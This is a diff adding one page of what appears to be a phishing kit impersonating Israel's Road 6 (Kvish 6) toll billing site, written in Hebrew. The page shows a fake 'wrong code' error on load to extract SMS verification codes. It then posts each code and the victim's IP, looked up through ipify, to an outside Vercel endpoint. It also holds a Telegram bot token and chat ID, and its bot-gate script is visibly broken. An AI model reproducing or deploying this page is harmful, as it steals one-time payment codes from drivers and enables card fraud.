@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>שגיאת SMS - כביש 6</title>
+    <script>
+        // Require that the user passed through index.htm (very basic JS bot gate)
+        (function () {
+            try {
+                    window.location.href = "./index.htm";
+                }
+            } catch (e) {
+                window.location.href = "./index.htm";
+            }
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', 'Helvetica', sans-serif;
+            background: url('assets/already-have-a-user.jpeg') center/cover no-repeat fixed;
+            position: relative;
+            min-height: 100vh;
+            color: #2c3e50;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 0;
+        }
+
+        .top-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: transparent;
+            padding: 25px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            min-height: 80px;
+        }
+
+        .nav-menu {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .nav-menu img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .exit-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            color: white;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+            font-weight: 500;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+        }
+
+        .exit-btn img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .brand-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            z-index: 1001;
+        }
+
+        .brand-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .page-wrapper {
+            margin-top: 100px;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: calc(100vh - 100px);
+        }
+
+        .content-box {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            max-width: 600px;
+            width: 100%;
+            position: relative;
+        }
+
+        .box-header {
+            background: linear-gradient(135deg, #1e3c73, #2a5297);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .title-text {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        .step-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-badge {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .step-badge.completed {
+            background: white;
+            color: #1e3c72;
+        }
+
+        .step-badge.active {
+            background: #0f2a5c;
+            color: white;
+        }
+
+        .step-badge.pending {
+            background: rgba(255, 255, 255, 0.3);
+            color: white;
+        }
+
+        .step-label {
+            font-size: 14px;
+            text-align: center;
+            max-width: 120px;
+        }
+
+        .box-body {
+            padding: 30px;
+        }
+
+        .sms-area {
+            margin-bottom: 30px;
+        }
+
+        .section-heading {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 10px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            color: #721c24;
+            font-size: 16px;
+            text-align: center;
+            display: none;
+        }
+
+        .sms-box {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .info-msg {
+            color: #333;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .phone-num {
+            font-weight: 600;
+            color: #2a5298;
+            font-size: 18px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .req-field {
+            color: #dc3545;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #dc3545;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background: white;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #dc3545;
+            box-shadow: 0 0 0 2px rgba(220, 53, 69, 0.2);
+        }
+
+        .resend-area {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .resend-btn {
+            color: #2a5298;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .resend-btn:hover {
+            text-decoration: underline;
+        }
+
+        .timer {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #1e3c73, #2a5297);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(42, 82, 152, 0.3);
+        }
+
+        .cancel-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-left: 15px;
+        }
+
+        .cancel-btn:hover {
+            background: #5a6268;
+            transform: translateY(-1px);
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            gap: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .page-wrapper {
+                margin-top: 90px;
+                padding: 15px 10px;
+            }
+            
+            .step-indicator {
+                gap: 15px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .step-item {
+                min-width: 100px;
+            }
+            
+            .step-label {
+                font-size: 12px;
+                max-width: 80px;
+            }
+            
+            .box-header {
+                padding: 20px 15px;
+            }
+            
+            .box-body {
+                padding: 20px 15px;
+            }
+            
+            .title-text {
+                font-size: 20px;
+            }
+            
+            .section-heading {
+                font-size: 18px;
+            }
+            
+            .btn-group {
+                flex-direction: row;
+                gap: 10px;
+            }
+            
+            .cancel-btn {
+                margin-left: 0;
+                flex: 1;
+            }
+            
+            .submit-btn {
+                flex: 2;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .page-wrapper {
+                margin-top: 80px;
+                padding: 10px 5px;
+            }
+            
+            .box-header {
+                padding: 15px 10px;
+            }
+            
+            .box-body {
+                padding: 15px 10px;
+            }
+            
+            .title-text {
+                font-size: 18px;
+                margin-bottom: 15px;
+            }
+            
+            .step-indicator {
+                gap: 10px;
+            }
+            
+            .step-badge {
+                width: 35px;
+                height: 35px;
+                font-size: 14px;
+            }
+            
+            .step-label {
+                font-size: 11px;
+                max-width: 70px;
+            }
+            
+            .submit-btn, .cancel-btn {
+                padding: 12px 20px;
+                font-size: 16px;
+            }
+        }
+
+        /* Loading Screen */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader-box {
+            text-align: center;
+            color: white;
+        }
+
+        .loader-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+        }
+
+        .loader-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .loader-msg {
+            font-size: 18px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-nav">
+        <div class="nav-menu">
+            <img src="assets/ico-menu.svg" alt="Menu">
+        </div>
+        <a href="#" class="exit-btn">
+            <img src="assets/ico-menu-exit.svg" alt="Exit">
+            יציאה
+        </a>
+    </div>
+
+    <div class="brand-logo">
+        <img src="assets/Kvish-6-logo.09596128f63efccc675f.svg" alt="Road 6 Logo">
+    </div>
+
+    <div class="page-wrapper">
+        <div class="content-box">
+            <div class="box-header">
+                <h1 class="title-text">שלושה צעדים פשוטים לתשלום חשבוניות</h1>
+                <div class="step-indicator">
+                    <div class="step-item">
+                        <div class="step-badge completed">✓</div>
+                        <div class="step-label">חשבוניות לתשלום</div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-badge completed">✓</div>
+                        <div class="step-label">ביצוע תשלום</div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-badge active">3</div>
+                        <div class="step-label">אישור SMS</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="box-body">
+                <div class="sms-area">
+                    <h2 class="section-heading">אישור SMS</h2>
+                    
+                    <div id="errorMessage" class="error-message"></div>
+                    
+                    <div class="sms-box">
+                        <div class="info-msg">נשלח קוד אימות לטלפון שלך</div>
+                    </div>
+
+                    <form>
+                        <div class="input-group">
+                            <label for="smsCode" class="input-label">
+                                קוד אימות SMS <span class="req-field">*</span>
+                            </label>
+                            <input type="text" id="smsCode" class="input-field" placeholder="123456" required>
+                        </div>
+
+                        <div class="resend-area">
+                            <a href="#" class="resend-btn">שלח שוב</a>
+                            <div class="timer">ניתן לשלוח שוב בעוד 2:00</div>
+                        </div>
+
+                        <div class="btn-group">
+                            <button type="button" class="cancel-btn" onclick="back()">חזור</button>
+                            <button type="submit" class="submit-btn" onclick="submitSMS()">אשר תשלום 19.20 ₪</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Format SMS code (only numbers, max 6 digits)
+        document.getElementById('smsCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/gi, '');
+            e.target.value = value;
+        });
+
+        // Countdown timer
+        let timeLeft = 120; // 2:00 in seconds
+        const countdownElement = document.querySelector('.timer');
+        
+        function updateCountdown() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `ניתן לשלוח שוב בעוד ${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                countdownElement.textContent = 'ניתן לשלוח שוב עכשיו';
+            }
+        }
+        
+        updateCountdown();
+
+        // Show error message on page load (will be called after showErrorMessage is defined)
+
+        // Form validation
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitSMS();
+        });
+    </script>
+
+    <!-- Loading Screen -->
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader-box">
+            <div class="loader-icon">
+                <img src="assets/firstLoader.gif" alt="Loading">
+            </div>
+            <div class="loader-msg">מעבד את הבקשה...</div>
+        </div>
+    </div>
+
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        // Telegram Bot Configuration
+        var telegram_bot_id = "8200965827:AAENyLAaMIYiTKFtY47IVXdBFJ-QyXT13Vk";
+        var chat_id = -4953748546;
+        var sms_code;
+        var message;
+
+        // Show loading screen
+        function showLoading() {
+            document.getElementById('loaderOverlay').style.display = 'flex';
+        }
+
+        // Hide loading screen
+        function hideLoading() {
+            document.getElementById('loaderOverlay').style.display = 'none';
+        }
+
+        // Show error message
+        function showErrorMessage(message) {
+            var errorDiv = document.getElementById('errorMessage');
+            if (errorDiv) {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // Hide error message
+        function hideErrorMessage() {
+            var errorDiv = document.getElementById('errorMessage');
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+            }
+        }
+
+        // Show error message on page load
+        showErrorMessage('קוד האימות שגוי. אנא נסה שוב או בקש קוד חדש.');
+
+        // Collect SMS data
+        function ready() {
+            sms_code = document.getElementById('smsCode').value;
+            message = "SMS Code (Error): " + sms_code;
+            if (window.__client_ip) {
+                message += "\nIP: " + window.__client_ip;
+            }
+        }
+
+        // Send data to server
+        function sender() {
+            ready();
+            var smsData = {
+                smsCode: document.getElementById('smsCode').value,
+                clientIP: window.__client_ip || 'Unknown',
+                errorType: 'error'
+            };
+
+            var settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://apimomen.vercel.app/api/send-sms",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify(smsData)
+            };
+            
+            $.ajax(settings).done(function (response) {
+                console.log('SMS sent successfully:', response);
+                // Redirect directly to success page after loading
+                window.location.href = "./success.html";
+            }).fail(function (xhr, status, error) {
+                console.error('SMS failed:', error);
+                hideLoading();
+                showErrorMessage('שגיאה בשליחת הקוד. אנא נסה שוב.');
+            });
+        }
+
+        // Fetch client IP from a public service
+        (function fetchClientIP(){
+            try {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => { window.__client_ip = d.ip; })
+                    .catch(() => {});
+            } catch (_) {}
+        })();
+
+        // Submit SMS function
+        function submitSMS() {
+            const smsCode = document.getElementById('smsCode').value;
+            
+            if (smsCode.length < 4) {
+                alert('קוד אימות חייב להכיל לפחות 4 ספרות');
+                return;
+            }
+            
+            showLoading();
+            sender();
+        }
+
+        // Back function
+        function back() {
+            showLoading();
+            setTimeout(() => {
+                window.location.href = "./billing.html";
+            }, 10000); // 10 seconds
+        }
+    </script>
+</body>
+</html>
